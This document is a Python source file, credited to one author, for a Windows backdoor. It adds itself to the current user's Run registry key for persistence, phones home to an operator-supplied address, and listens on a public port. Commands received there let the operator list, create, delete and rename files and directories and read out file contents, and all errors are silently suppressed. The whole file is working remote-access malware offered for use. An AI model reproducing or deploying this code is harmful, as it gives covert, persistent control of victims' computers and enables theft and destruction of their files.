#by skayl56
import socket
import os
from winreg import *
from os import path



ADDRESS = '' #Your ip address local or homepage





PathFile = path.abspath(__file__)
def Startup():
    StartupKey = OpenKey(HKEY_CURRENT_USER,
                    r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                    0, KEY_ALL_ACCESS)
    SetValueEx(StartupKey, 'name', 0, REG_SZ, PathFile)
    CloseKey(StartupKey)

Startup()

try:
	connect = socket.socket()
	connect.connect((ADDRESS, 50007))

	connect.close() 
except:
	pass

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', 50008))
sock.listen(5)
sock.setblocking(5)


while True:
    try:
      	conn, addr = sock.accept()
      	try:
      		data = conn.recv(1024).decode()
      		if data == "ls":
      			ls_dir = os.listdir()
      			conn.send(str(ls_dir).encode())
      		elif data == "pwd":
      			pwd_dir = os.getcwd()
      			conn.send(str(pwd_dir).encode())

      		elif data[0] == "m" and data[1] == "k" and data[2] == "d":
      			argv = data.split("!")[1]
      			os.mkdir(str(argv))

      		elif data[0] == "r" and data[1] == "m" and data[2] == "d":
      			argv = data.split("!")[1]
      			os.rmdir(str(argv))

      		elif data[0] == "r" and data[1] == "e" and data[2] == "m":
      			argv = data.split("!")[1]
      			os.remove(str(argv))

      		elif data[0] == "r" and data[1] == "e" and data[2] == "n" and data[3] == "a":
      			argv = data.split("!")[1]
      			argv1 = data.split("!")[2]
      			os.rename(str(argv), str(argv1))

      		elif data[0] == "d" and data[1] == "o" and data[2] == "w":
      			argv = data.split("!")[1]
      			text_data = open(str(argv)).read()
      			name_data = str(argv)
      			file = name_data + "!" + text_data
      			conn.send(str(file).encode())

      		elif data[0] == "c" and data[1] == "d":
      			argv = data.split("!")[1]
      			os.chdir(str(argv))
      		else:
      			pass
      	except Exception as exc:
      		pass

    except Exception as exc:
    	pass